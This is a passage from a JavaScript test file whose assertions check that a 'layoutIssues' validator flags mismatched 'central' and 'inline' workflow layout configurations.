    expect((await layoutIssues({ layout: 'central', 'central-workflow': CW }, central)).length).toBeGreaterThan(0);
    expect((await layoutIssues({ layout: 'central', 'central-workflow': CW, 'central-sha': sha('d') }, central)).length).toBeGreaterThan(0);
    expect((await layoutIssues({ layout: 'inline', 'central-workflow': CW }, inline)).length).toBeGreaterThan(0);
    expect((await layoutIssues({ layout: 'inline', 'central-sha': CENTRAL.sha }, inline)).length).toBeGreaterThan(0);
  });
});
